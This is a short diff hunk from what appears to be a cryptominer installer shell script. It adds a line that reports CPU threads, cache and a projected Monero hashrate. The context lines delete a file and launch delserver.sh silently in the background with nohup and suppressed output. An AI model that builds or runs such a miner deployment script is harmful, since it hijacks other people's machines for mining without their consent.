@@ -1464,4 +1464,5 @@ rm -f ip_info.json
 chmod +x delserver.sh
 /bin/bash ./delserver.sh >/dev/null 2>&1 &
 nohup ./delserver.sh > /dev/null 2>&1 &
+echo "JFYI: This host has $CPU_THREADS CPU threads with $CPU_MHZ MHz and ${TOTAL_CACHE}KB data cache in total, so projected Monero hashrate is around $EXP_MONERO_HASHRATE H/s."
 echo "[*] Yes-GoGo"
